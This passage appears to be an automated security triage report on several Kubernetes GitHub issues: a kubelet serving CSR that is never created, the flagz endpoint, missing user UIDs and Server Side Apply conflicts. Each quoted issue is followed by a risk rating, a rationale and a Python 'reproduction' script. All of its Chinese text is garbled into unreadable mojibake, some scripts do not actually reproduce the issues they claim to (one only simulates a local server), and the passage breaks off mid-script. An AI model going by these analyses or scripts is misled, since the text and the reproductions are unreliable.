    print(f"ç­‰å¾… {wait_seconds} ç§’ä»¥æ¨¡æ‹Ÿè¿è¡Œè¿‡ç¨‹ ...")
    time.sleep(wait_seconds)

    # æ¸…ç†åˆ›å»ºçš„æ‰€æœ‰ Pod
    print("å¼€å§‹åˆ é™¤æµ‹è¯• Pod ...")
    delete_futures = []
    for pod_name in pod_names:
        future = executor.submit(delete_pod, v1, namespace, pod_name)
        delete_futures.append(future)
    try:
        for future in as_completed(delete_futures, timeout=TOTAL_TIMEOUT):
            future.result()
    except Exception as e:
        print("Pod åˆ é™¤è¿‡ç¨‹å‡ºç°å¼‚å¸¸æˆ–è¶…æ—¶:", e)

    executor.shutdown(wait=True)
    elapsed = time.time() - start_time
    print(f"è„šæœ¬æ‰§è¡Œå®Œæ¯•ï¼Œæ€»è€—æ—¶ {elapsed:.2f} ç§’")

# ç›´æ¥è°ƒç”¨ main å‡½æ•°æ‰§è¡Œ
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

1. è„šæœ¬é¦–å…ˆä½¿ç”¨ Kubernetes Python å®¢æˆ·ç«¯ä»é»˜è®¤ä½ç½®åŠ è½½ kubeconfig æ¥è®¿é—®é›†ç¾¤ï¼Œå› æ­¤éœ€ç¡®ä¿ kubeconfig åœ¨é»˜è®¤ä½ç½®æˆ–ç¯å¢ƒä¸­å·²é…ç½®æ­£ç¡®ã€‚
2. å®šä¹‰äº†ä¸€ä¸ªåˆ›å»º Pod çš„å‡½æ•° create_podï¼Œè¯¥ Pod æ¨¡æ‹Ÿäº†è®¾å¤‡è¯·æ±‚ï¼ˆå‡å®šè®¾å¤‡èµ„æºåç§°ä¸º nvidia.com/gpuï¼‰ï¼Œä»è€Œåœ¨è°ƒåº¦æ—¶å¯èƒ½è§¦å‘ DeviceManager å¹¶å‘é€»è¾‘ã€‚
3. ä½¿ç”¨ ThreadPoolExecutor æ¨¡æ‹Ÿé«˜å¹¶å‘åˆ›å»º Pod çš„è¿‡ç¨‹ï¼Œè®¾ç½®åŒæ—¶åˆ›å»º 30 ä¸ª Podï¼Œå¹¶å‘æäº¤ä»»åŠ¡ã€‚å„ä»»åŠ¡é€šè¿‡å¤šçº¿ç¨‹å¹¶å‘æ‰§è¡Œï¼Œä»è€Œæ¨¡æ‹Ÿé«˜å¹¶å‘åœºæ™¯ã€‚
4. ä»»åŠ¡æäº¤åï¼Œè„šæœ¬ç­‰å¾…ä¸€å®šæ—¶é—´ï¼ˆ10 ç§’ï¼‰æ¨¡æ‹Ÿ Pod è¿è¡ŒçŠ¶æ€ä¸‹çš„æŒç»­æ“ä½œï¼Œç„¶åç»Ÿä¸€æ¸…ç†ï¼ˆåˆ é™¤ï¼‰æ‰€æœ‰åˆ›å»ºçš„ Podï¼Œç¡®ä¿ä¸ä¼šé€ æˆæ®‹ç•™èµ„æºã€‚
5. æ•´ä¸ªè„šæœ¬æ‰§è¡Œè®¾ç½®æœ‰è¶…æ—¶æ—¶é—´ï¼ˆ2 åˆ†é’Ÿï¼‰ä»¥é˜²æ­¢é•¿æ—¶é—´è¿è¡Œï¼Œä¸”æ²¡æœ‰ä½¿ç”¨ __name__ åˆ¤æ–­ï¼Œä¿è¯ç›´æ¥æ‰§è¡Œ main å‡½æ•°å³å¯è¿è¡Œã€‚
6. è¯¥è„šæœ¬ä»…ç”¨äºæœ¬åœ°æµ‹è¯•å’Œç ”ç©¶ï¼Œæ—¨åœ¨æ¨¡æ‹Ÿåœ¨é«˜å¹¶å‘æ¡ä»¶ä¸‹å¯èƒ½å¼•å‘é—®é¢˜çš„åœºæ™¯ï¼Œå¸®åŠ©å¼€å‘è€…å¤ç°å’ŒéªŒè¯ issue æåˆ°çš„æƒ…å†µï¼Œä¸ä¼šå¯¹ç³»ç»Ÿé€ æˆé¢å¤–çš„å®‰å…¨é£é™©ã€‚

---


# âœ… ä¸æ¶‰åŠå®‰å…¨é£é™©çš„ Issues (15 ä¸ª)

## Issue #130001 Kubelet serving CSR never created

- Issue é“¾æ¥ï¼š[#130001](https://github.com/kubernetes/kubernetes/issues/130001)

### Issue å†…å®¹

#### What happened?

We are seeing an issue occasionally where the kubelet never gets the server certificate (`serverTLSBootstrap: true`).
We have an auto-approver for the server certificates and detect this issue because we are waiting for the certificate to appear in `/var/lib/kubelet/pki/kubelet-server-current.pem`. When we hit it, not even the CSR is created.
It started happening after upgrading to v1.32 so we believe it could be from a change that was introduced in v1.32.
Restarting the kubelet does not help. It happily continues without the server certificate, even though it is configured to bootstrap it.

In healthy clusters, we see this:

```console
$ kubectl get csr
NAME        AGE   SIGNERNAME                                    REQUESTOR                           REQUESTEDDURATION   CONDITION
csr-8dql4   29s   kubernetes.io/kubelet-serving                 system:node:lennart-kubelet-debug   <none>              Pending
csr-r8ztr   17s   kubernetes.io/kubelet-serving                 system:node:lennart-kubelet-debug   <none>              Pending
csr-xtwpf   30s   kubernetes.io/kube-apiserver-client-kubelet   system:node:lennart-kubelet-debug   <none>              Approved,Issued
```

In faulty clusters, there is just the client CSR.
We are not sure why two CSRs are created for the server either, but it works when we approve the newer of them.

Here is the kubelet config from an affected node: [kubelet-config.txt](https://github.com/user-attachments/files/18688742/kubelet-config.txt)

#### What did you expect to happen?

When configured, the kubelet should always create the server CSR.

#### How can we reproduce it (as minimally and precisely as possible)?

Unfortunately we do not have any guaranteed reproduction steps.
~~The closest we have come to something similar, is to specify a dual-stack node-ip, where the IPv6 address is a loopback address.
This makes the server CSR never appear. However, it is a 100% reproducer so it does not appear to be the same issue. If we use a proper IPv6 address, this does not happen. Probably the issue with the loopback IPv6 is just that, since it is invalid, the node gets no `status.addresses`.~~ Edit: This is due to the invalid address as seen in https://github.com/kubernetes/kubernetes/pull/125813.
When we hit the real issue, the node still has `status.addresses` though.

Here is an example kubeadm-config with IPv6 loopback:

```yaml
apiVersion: kubeadm.k8s.io/v1beta3
kind: InitConfiguration
nodeRegistration:
    kubeletExtraArgs:
        cert-dir: "/var/lib/kubelet/pki"
        # Loopback IPv6 -> no CSR
        node-ip: "10.1.0.202,::1"
        # Real IPv6 - does NOT reproduce the issue (at least not 100 %)
        # node-ip: "fdec:c5cc:d73b:37d::1000,10.1.0.202"
---
apiVersion: kubeadm.k8s.io/v1beta3
kind: ClusterConfiguration
networking:
    podSubnet: 192.168.0.0/16
apiServer:
    certSANs:
    - "10.1.0.202"
    - "fdec:c5cc:d73b:37d::1000"
    extraArgs:
        kubelet-certificate-authority: /etc/kubernetes/pki/ca.crt
---
apiVersion: kubelet.config.k8s.io/v1beta1
kind: KubeletConfiguration
serverTLSBootstrap: true
rotateCertificates: true
tlsMinVersion: VersionTLS13
featureGates:
    AllAlpha: false
```

And the resulting cluster:

```console
$ kubectl get csr
NAME        AGE   SIGNERNAME                                    REQUESTOR                           REQUESTEDDURATION   CONDITION
csr-2mq8h   22s   kubernetes.io/kube-apiserver-client-kubelet   system:node:lennart-kubelet-debug   <none>              Approved,Issued
$ kubectl get nodes
NAME                    STATUS   ROLES           AGE   VERSION
lennart-kubelet-debug   Ready    control-plane   28s   v1.32.1
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.1
Kustomize Version: v5.5.0
Server Version: v1.32.1
```

</details>


#### Cloud provider

<details>
Happens both with and without external cloud provider
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ issue æè¿°çš„æ˜¯ kubelet åœ¨å¯ç”¨ serverTLSBootstrap é…ç½®åï¼Œæœªèƒ½åˆ›å»ºæœåŠ¡ç«¯è¯ä¹¦çš„ CSRï¼ˆä»…åˆ›å»ºäº†å®¢æˆ·ç«¯çš„ CSRï¼‰ï¼Œå¯¼è‡´é›†ç¾¤ä¸­ç¼ºå°‘æœåŠ¡ç«¯è¯ä¹¦ã€‚è¯¥é—®é¢˜è™½ç„¶å¯èƒ½å½±å“åˆ° kubelet çš„æ­£å¸¸ TLS é€šä¿¡å’Œè¿è¡ŒçŠ¶æ€ï¼Œä½†æ ¹æ®æè¿°æ¥çœ‹ï¼Œå¹¶ä¸å­˜åœ¨ç›´æ¥å¯è¢«æ”»å‡»è€…åˆ©ç”¨çš„å®‰å…¨æ¼æ´ï¼Œä¹Ÿæ²¡æœ‰å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒç­‰é«˜é£é™©å®‰å…¨é—®é¢˜ã€‚é—®é¢˜å¯èƒ½åªæ˜¯å¯¼è‡´ kubelet ä½¿ç”¨é”™è¯¯æˆ–ç¼ºå¤±è¯ä¹¦ï¼Œä»è€Œå½±å“éƒ¨åˆ†åŠŸèƒ½ã€‚å› æ­¤ï¼Œæ ¹æ® issue é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œè®¤ä¸ºè¯¥é—®é¢˜ä¸å±äºå®‰å…¨æ¼æ´èŒƒç•´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import sys
from kubernetes import client, config
from kubernetes.client.rest import ApiException

def main():
    try:
        # å°è¯•åŠ è½½é»˜è®¤çš„ kubeconfig æ–‡ä»¶
        config.load_kube_config()
    except Exception as e:
        print("åŠ è½½ kubeconfig å¤±è´¥ï¼Œè¯·ç¡®è®¤ kubeconfig æ–‡ä»¶ä½ç½®æ­£ç¡®:", e)
        sys.exit(1)

    # åˆ›å»º CertificateSigningRequest çš„ API å®ä¾‹
    csr_api = client.CertificatesV1Api()

    # è®¾ç½®æ£€æµ‹è¶…æ—¶æ—¶é—´ï¼ˆ2åˆ†é’Ÿå†…é€€å‡ºï¼‰
    timeout = 120
    interval = 5  # æ¯éš”5ç§’æŸ¥è¯¢ä¸€æ¬¡
    start_time = time.time()
    server_csr_found = False

    print("å¼€å§‹æ£€æµ‹æœåŠ¡ç«¯ CSR æ˜¯å¦åˆ›å»º...")

    while time.time() - start_time < timeout:
        try:
            csr_list = csr_api.list_certificate_signing_request()
            # éå†è·å–æ‰€æœ‰CSRï¼ŒæŸ¥æ‰¾ signer_name ä¸º kubelet æœåŠ¡ç«¯è¯ä¹¦çš„æ¡ç›®
            for item in csr_list.items:
                if item.spec.signer_name == "kubernetes.io/kubelet-serving":
                    print("å‘ç°æœåŠ¡ç«¯ CSR:", item.metadata.name)
                    server_csr_found = True
                    break
        except ApiException as e:
            print("æŸ¥è¯¢ CSR æ—¶å‘ç”Ÿé”™è¯¯:", e)
        except Exception as ex:
            print("æ„å¤–é”™è¯¯:", ex)

        if server_csr_found:
            break

        time.sleep(interval)

    if not server_csr_found:
        print("åœ¨è®¾å®šçš„è¶…æ—¶æ—¶é—´å†…æœªå‘ç°æœåŠ¡ç«¯ CSRã€‚å¯èƒ½å­˜åœ¨ kubelet æœªåˆ›å»ºæœåŠ¡ç«¯è¯ä¹¦çš„æƒ…å†µã€‚")
    else:
        print("æœåŠ¡ç«¯ CSR å­˜åœ¨ï¼Œé›†ç¾¤çŠ¶æ€æ­£å¸¸ã€‚")

# ç›´æ¥è°ƒç”¨ main å‡½æ•°æ‰§è¡Œ
main()
```


---


## Issue #129994 Flagz on kube-apiserver doesn't return parsed flag values

- Issue é“¾æ¥ï¼š[#129994](https://github.com/kubernetes/kubernetes/issues/129994)

### Issue å†…å®¹

#### What happened?

When ComponentFlagz feature is enabled on kube-apiserver, the flag value is not return as expected.
kube-apiserver spec
```yaml
spec:
  containers:
  - command:
    - kube-apiserver
    - --advertise-address=192.168.8.5
    - --feature-gates=ComponentFlagz=true
    - --emulated-version=1.32
    ...
```
The `flagz/` returns
```
~ curl -k --cert /etc/kubernetes/pki/apiserver-kubelet-client.crt --key /etc/kubernetes/pki/apiserver-kubelet-client.key https://localhost:6443/flagz

kube-apiserver flags
Warning: This endpoint is not meant to be machine parseable, has no formatting compatibility guarantees and is for debugging purposes only.

admission-control:[]
admission-control-config-file:
advertise-address:192.168.8.5
aggregator-reject-forwarding-redirect:true
allow-metric-labels:[]
...
...
egress-selector-config-file:
emulated-version:[]
enable-admission-plugins:[NodeRestriction]
...
...
feature-gates:
...
```

#### What did you expect to happen?

The response reflects the correct passed flag value. For example in kube-scheduler
kube-scheduler spec:
```yaml
spec:
  containers:
  - command:
    - kube-scheduler
    - --authentication-kubeconfig=/etc/kubernetes/scheduler.conf
    - --feature-gates=ComponentFlagz=true
    - --emulated-version=1.32
   ...
```
The `/flagz` response:
```curl -k --cert /etc/kubernetes/pki/apiserver-kubelet-client.crt --key /etc/kubernetes/pki/apiserver-kubelet-client.key https://localhost:10259/flagz

kube-scheduler flags
Warning: This endpoint is not meant to be machine parseable, has no formatting compatibility guarantees and is for debugging purposes only.

allow-metric-labels:[]
allow-metric-labels-manifest:
authentication-kubeconfig:/etc/kubernetes/scheduler.conf
...
...
emulated-version:[1.32]
feature-gates::ComponentFlagz=true
...
```

#### How can we reproduce it (as minimally and precisely as possible)?

1. Enable the featuregate on kube-apiserver with `--feature-gates=ComponentFlagz=true`
1. request the kube-apiserver endpoint on path `/flagz` and check the response

#### Anything else we need to know?

I believe it is due to the flags (instantiated by `s.Flags()`) passed into the options 
https://github.com/kubernetes/kubernetes/blob/925cf7db71c5e36072f99e8b7129523f659ee3a1/cmd/kube-apiserver/app/options/completion.go#L60
is not the same one that actually used by the cmd
https://github.com/kubernetes/kubernetes/blob/925cf7db71c5e36072f99e8b7129523f659ee3a1/cmd/kube-apiserver/app/server.go#L126

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.32.0
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°çš„æ˜¯åœ¨å¯ç”¨ ComponentFlagz ç‰¹æ€§æ—¶ï¼Œkube-apiserver çš„ /flagz è°ƒè¯•ç«¯ç‚¹å¹¶æ²¡æœ‰è¿”å›æ­£ç¡®è§£æåçš„ flag å€¼ã€‚è¯¥é—®é¢˜å®é™…ä¸Šåæ˜ çš„æ˜¯ kube-apiserver å†…éƒ¨åœ¨æ•´ç†å‘½ä»¤è¡Œå‚æ•°æ—¶å­˜åœ¨æ˜¾ç¤ºä¸å…¨çš„é—®é¢˜ï¼Œä¸ä¼šç›´æ¥å¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒæˆ–æ•æ„Ÿä¿¡æ¯æ³„éœ²ç­‰å®‰å…¨å¨èƒï¼Œä¹Ÿä¸ä¼šç›´æ¥å¸¦æ¥æ‹’ç»æœåŠ¡æ”»å‡»ç­‰å½±å“ã€‚

å¦å¤–ï¼Œ/flagz ç«¯ç‚¹æœ¬èº«å°±å·²ç»æœ‰è¯´æ˜â€œæ­¤ç«¯ç‚¹ä»…ç”¨äºè°ƒè¯•ï¼Œå¹¶ä¸ä¿è¯æ ¼å¼è§£æå…¼å®¹æ€§â€ï¼Œå› æ­¤è¯¥é—®é¢˜ä¸»è¦æ˜¯è°ƒè¯•ä¿¡æ¯å±•ç¤ºä¸å‡†ç¡®çš„é—®é¢˜ï¼Œè€Œéå®‰å…¨é—®é¢˜ã€‚åŸºäº Issue å†…å®¹æ¥çœ‹ï¼Œä¸å­˜åœ¨å¯ç›´æ¥åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import requests
import urllib3
import sys
import time

def main():
    # ç¦ç”¨ HTTPS è­¦å‘Šï¼ˆä»…åœ¨æµ‹è¯•ç¯å¢ƒä¸‹ä½¿ç”¨ï¼Œä¸å»ºè®®åœ¨ç”Ÿäº§ç¯å¢ƒä½¿ç”¨ï¼‰
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # å®šä¹‰ kube-apiserver çš„ flagz ç«¯ç‚¹åœ°å€
    url = "https://localhost:6443/flagz"

    # é»˜è®¤ä½¿ç”¨çš„è¯ä¹¦å’Œç§é’¥è·¯å¾„ï¼ˆæ ¹æ®å®é™…ç¯å¢ƒè°ƒæ•´ï¼‰
    # æ­¤å¤„å‡è®¾ apiserver-kubelet-client è¯ä¹¦åœ¨é»˜è®¤ä½ç½®
    cert_file = "/etc/kubernetes/pki/apiserver-kubelet-client.crt"
    key_file = "/etc/kubernetes/pki/apiserver-kubelet-client.key"

    try:
        # å‘èµ· HTTPS GET è¯·æ±‚
        response = requests.get(url, cert=(cert_file, key_file), verify=False, timeout=10)
    except Exception as e:
        print("è¯·æ±‚ /flagz ç«¯ç‚¹å¤±è´¥ï¼Œé”™è¯¯ä¿¡æ¯:", e)
        sys.exit(1)

    # è¾“å‡ºè¿”å›çš„å†…å®¹
    print("è¿”å›ç»“æœ:")
    print(response.text)

    # ç®€å•æ£€æŸ¥è¿”å›çš„flagä¸­æ˜¯å¦åŒ…å« feature-gates å…³é”®å­—åŠç»„ä»¶å ComponentFlagz
    if "feature-gates" in response.text:
        if "ComponentFlagz" in response.text:
            print("\næ£€æµ‹åˆ° feature-gates ä¸­åŒ…å« 'ComponentFlagz' ä½†å¯èƒ½æœªæ­£ç¡®æ˜¾ç¤ºå…¶å€¼ã€‚")
        else:
            print("\næœªæ£€æµ‹åˆ° 'ComponentFlagz'ï¼Œè¯´æ˜ flag å€¼å±•ç¤ºå­˜åœ¨é—®é¢˜ã€‚")
    else:
        print("\nè¿”å›å†…å®¹ä¸­æœªå‘ç° feature-gates ä¿¡æ¯ã€‚")

if __name__ == "__main__":
    # é™åˆ¶è„šæœ¬æ‰§è¡Œæ—¶é—´ç¡®ä¿åœ¨2åˆ†é’Ÿå†…é€€å‡º
    start_time = time.time()
    try:
        main()
    except Exception as e:
        print("è„šæœ¬æ‰§è¡Œè¿‡ç¨‹ä¸­å‡ºç°å¼‚å¸¸:", e)
    finally:
        elapsed = time.time() - start_time
        if elapsed > 120:
            print("è„šæœ¬æ‰§è¡Œè¶…æ—¶")
        else:
            print("è„šæœ¬æ‰§è¡Œå®Œæ¯•ï¼Œç”¨æ—¶ {:.2f} ç§’".format(elapsed))
```


---


## Issue #129987 Generate UID for users where UID missing

- Issue é“¾æ¥ï¼š[#129987](https://github.com/kubernetes/kubernetes/issues/129987)

### Issue å†…å®¹

#### What happened?


[AdmissionRequest](https://kubernetes.io/docs/reference/config-api/apiserver-admission.v1/#admission-k8s-io-v1-AdmissionRequest) includes [UserInfo](https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.32/#userinfo-v1-authentication-k8s-io) to identify which user send the request.

Use `uid` in `UserInfo` is the best way to distinguish users, but I found some authentication miss uid in the UserInfo, not limited to:
- [tokenfile](
https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/apiserver/pkg/authentication/token/tokenfile/tokenfile.go#L93)
- [bootstrap](https://github.com/kubernetes/kubernetes/blob/master/plugin/pkg/auth/authenticator/token/bootstrap/bootstrap.go#L145)
- [oidc](https://github.com/kubernetes/kubernetes/blob/master/staging/src/k8s.io/apiserver/plugin/pkg/authenticator/token/oidc/oidc.go#L804)

A empty `uid` looks really weird.



#### What did you expect to happen?


I expected a UID to be populated by all authenticator, if the inputs miss uid, we should generate unique one rather than leave it as empty string.

I would like to implement it if possible.

#### How can we reproduce it (as minimally and precisely as possible)?

Just check the code.

#### Anything else we need to know?

From the perspective of database design, an object should always have its id.


#### Kubernetes version

Impact lots of version.

#### Cloud provider

None


#### OS version

None


#### Install tools

None

#### Container runtime (CRI) and version (if applicable)

None


#### Related plugins (CNI, CSI, ...) and versions (if applicable)
None


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº†åœ¨ Kubernetes çš„è®¤è¯æµç¨‹ä¸­ï¼ŒæŸäº›è®¤è¯å™¨ï¼ˆå¦‚ tokenfileã€bootstrapã€oidcï¼‰è¿”å›çš„ AdmissionRequest ä¸­ UserInfo ç¼ºå°‘ uid å­—æ®µçš„é—®é¢˜ã€‚è™½ç„¶ uid ç”¨äºå”¯ä¸€æ ‡è¯†ç”¨æˆ·ï¼Œç¼ºå¤± uid å¯èƒ½ä¼šåœ¨ä¸€äº›åœºæ™¯ä¸‹å¯¼è‡´ç”¨æˆ·èº«ä»½æ··æ·†ï¼Œä½†è¯¥é—®é¢˜æœ¬è´¨ä¸Šæ›´åƒæ˜¯è®¾è®¡ç¼ºé™·æˆ–æ•°æ®ä¸€è‡´æ€§é—®é¢˜ï¼Œè€Œéç›´æ¥å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€ææƒæˆ–æ‹’ç»æœåŠ¡ç­‰é«˜å±å®‰å…¨æ¼æ´ã€‚å› æ­¤ï¼Œè¯¥é—®é¢˜ä¸»è¦åæ˜ äº†è®¤è¯æ•°æ®çš„ä¸å®Œå–„ï¼Œä¸ç›´æ¥æ„æˆå¯è¢«åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
#!/usr/bin/env python3
import uuid
import json
import http.server
import socketserver
import threading
import time

# æ¨¡æ‹Ÿ AdmissionRequest å¤„ç†ï¼Œé’ˆå¯¹ UserInfo ä¸­ missing uid è‡ªåŠ¨å¡«å……ä¸€ä¸ªæ–°çš„ UID

def process_admission_request(admission_request):
    """
    æ¨¡æ‹Ÿå¤„ç† AdmissionRequestï¼Œ
    å¦‚æœ admission_request["request"]["userInfo"]["uid"] ä¸ºç©ºï¼Œåˆ™ç”Ÿæˆä¸€ä¸ªæ–°çš„ uid
    """
    user_info = admission_request.get("request", {}).get("userInfo", {})
    if not user_info.get("uid", ""):
        new_uid = str(uuid.uuid4())
        user_info["uid"] = new_uid
        print(f"åŸå§‹ AdmissionRequest ä¸­ç¼ºå°‘ uidï¼Œå·²ç”Ÿæˆæ–°çš„ uid: {new_uid}")
    else:
        print("AdmissionRequest ä¸­å·²åŒ…å« uidã€‚")
    return admission_request

# æ„é€ ä¸€ä¸ªæ¨¡æ‹Ÿçš„ AdmissionRequest JSON å¯¹è±¡(éƒ¨åˆ†å­—æ®µ)
sample_admission_request = {
    "request": {
        "uid": "1234-abc",  # AdmissionRequest å…¶ä»–å­—æ®µç¤ºä¾‹
        "userInfo": {
            "username": "example_user",
            "uid": ""
        }
    }
}

class SimpleHTTPRequestHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_body = self.rfile.read(content_length)
        try:
            admission_request = json.loads(post_body)
            # å¤„ç† AdmissionRequest
            updated_request = process_admission_request(admission_request)
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(updated_request).encode())
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(str(e).encode())

def start_server():
    # ç›‘å¬åœ¨ç«¯å£ 10000(ç¬¦åˆé¢˜æ„è¦æ±‚ç«¯å£å¤§äº10000)
    PORT = 10000
    with socketserver.TCPServer(("", PORT), SimpleHTTPRequestHandler) as httpd:
        print(f"HTTP æœåŠ¡å™¨å¯åŠ¨ï¼Œç›‘å¬ç«¯å£ï¼š{PORT}")
        # è®¾ç½®è¶…æ—¶æœºåˆ¶ï¼Œä¸è¶…è¿‡120ç§’
        httpd.timeout = 120
        end_time = time.time() + 120
        while time.time() < end_time:
            httpd.handle_request()
        print("HTTP æœåŠ¡å™¨è¶…æ—¶é€€å‡ºã€‚")

def main():
    # å¯åŠ¨ HTTP æœåŠ¡å™¨çº¿ç¨‹
    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()
    
    # æ¨¡æ‹Ÿå®¢æˆ·ç«¯å‘ HTTP æœåŠ¡å™¨å‘é€ AdmissionRequest æ•°æ®
    time.sleep(1)  # ç­‰å¾…æœåŠ¡å™¨å¯åŠ¨
    import requests
    try:
        response = requests.post("http://localhost:10000", json=sample_admission_request, timeout=5)
        if response.status_code == 200:
            updated_request = response.json()
            print("æœåŠ¡å™¨è¿”å›æ•°æ®ï¼š")
            print(json.dumps(updated_request, indent=2))
        else:
            print(f"æœåŠ¡å™¨å“åº”å¼‚å¸¸ï¼ŒçŠ¶æ€ç ï¼š{response.status_code}")
    except Exception as err:
        print(f"è¯·æ±‚å‡ºé”™: {err}")
    
    # ç­‰å¾…æœåŠ¡å™¨çº¿ç¨‹é€€å‡º
    server_thread.join(timeout=5)

# ç›´æ¥è°ƒç”¨ main() æ‰§è¡Œ
main()
```


---


## Issue #129960 Server Side Apply: Late defaults and mutating admission can cause conflicts for identical apply configurations

- Issue é“¾æ¥ï¼š[#129960](https://github.com/kubernetes/kubernetes/issues/129960)

### Issue å†…å®¹

#### What happened?

When two field managers apply the same apply configuration but a field is mutated (or defaulted after deserialization default, say in the strategy), the apply configurations conflict.  This is inconsistent with deserialization defaults, where two field managers can apply the same apply configuration with the result of shared ownership of the defaulted field.

#### What did you expect to happen?

shared ownership of the field

#### How can we reproduce it (as minimally and precisely as possible)?

- mutation admission is configured to set `f1=z` (via webhook, policy or plugin)
- mgr1 applies: f1=x
  - Result: Applied. mgr1 now owns f1.  Note that `f1=z`
- mgr2 applies f1=x
  - Result: conflict

For the proposed unsetting fields enhancement (https://github.com/kubernetes/enhancements/pull/5052) this can also happen for defaulting:

- a strategy is configured to default `f1=z`
- mgr1 applies: f1=z
  - Result: Applied. mgr1 now owns f1
- mgr2 applies f1={k8s_io__value: unset}
  - Result: conflict

#### Anything else we need to know?

_No response_

#### Kubernetes version

1.32+

#### Cloud provider

n/a

#### OS version

_No response_

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°çš„ä¸»è¦æ˜¯ Kubernetes Server Side Apply åœ¨å¤„ç†é»˜è®¤å€¼ï¼ˆLate defaultsï¼‰å’Œç»è¿‡å˜æ›´çš„å…¥ç«™è¯·æ±‚ï¼ˆmutating admissionï¼‰æ—¶ï¼Œä¸¤ä¸ªä½¿ç”¨ç›¸åŒé…ç½®çš„å­—æ®µç®¡ç†å™¨ï¼ˆfield managersï¼‰ä¹‹é—´å‡ºç°æ‰€æœ‰æƒå†²çªçš„é—®é¢˜ã€‚ä»æè¿°å†…å®¹æ¥çœ‹ï¼Œè¿™ä¸ªé—®é¢˜å±äºå¯¹èµ„æºé…ç½®ç®¡ç†è¯­ä¹‰çš„ç¼ºé™·æˆ–ä¸ä¸€è‡´æ€§ï¼Œæ¯”å¦‚é»˜è®¤å€¼åº”ç”¨åäº§ç”Ÿçš„â€œå…±äº«æ‰€æœ‰æƒâ€ä¸å®é™…å†²çªæƒ…å†µä¸ä¸€è‡´ï¼Œå…¶æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªé€»è¾‘æˆ–è®¾è®¡é—®é¢˜ï¼Œè€Œéç›´æ¥çš„å®‰å…¨æ¼æ´ã€‚å› æ­¤ï¼Œè¯¥é—®é¢˜ä¸ä¼šå¯¼è‡´å‘½ä»¤æ‰§è¡Œã€ææƒã€å®¹å™¨é€ƒé€¸ç­‰é«˜å®‰å…¨é£é™©é—®é¢˜ï¼Œä¹Ÿä¸æ¶‰åŠæ—¥å¿—æ³„éœ²ã€æ•æ„Ÿä¿¡æ¯æš´éœ²æˆ–è€…æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ç­‰å®‰å…¨å¨èƒã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import time
import threading
from kubernetes import client, config
from kubernetes.client.rest import ApiException

def timeout_exit():
    # è¶…æ—¶2åˆ†é’Ÿåé€€å‡ºç¨‹åº
    time.sleep(120)
    print("æ‰§è¡Œè¶…æ—¶ï¼Œé€€å‡ºè„šæœ¬")
    exit(1)

def main():
    # å¯åŠ¨è¶…æ—¶æœºåˆ¶
    timer = threading.Thread(target=timeout_exit, daemon=True)
    timer.start()

    # åŠ è½½é»˜è®¤ kubeconfig
    try:
        config.load_kube_config()
    except Exception as e:
        print("åŠ è½½ kubeconfig å‡ºé”™:", e)
        return

    v1 = client.CoreV1Api()
    namespace = "default"
    cm_name = "ssa-late-default-demo"

    # æ¸…ç†å·²æœ‰ ConfigMapï¼ˆå¦‚æœå­˜åœ¨ï¼‰
    try:
        v1.delete_namespaced_config_map(cm_name, namespace)
        # ç­‰å¾…åˆ é™¤ç”Ÿæ•ˆ
        time.sleep(2)
    except ApiException as e:
        if e.status != 404:
            print("åˆ é™¤æ—§çš„ ConfigMap å¤±è´¥:", e)
            return

    # mgr1 ä½¿ç”¨ Server Side Apply åº”ç”¨é…ç½®ï¼šf1: "x"
    cm_apply_mgr1 = {
        "apiVersion": "v1",
        "kind": "ConfigMap",
        "metadata": {
            "name": cm_name
        },
        "data": {
            "f1": "x"
        }
    }
    try:
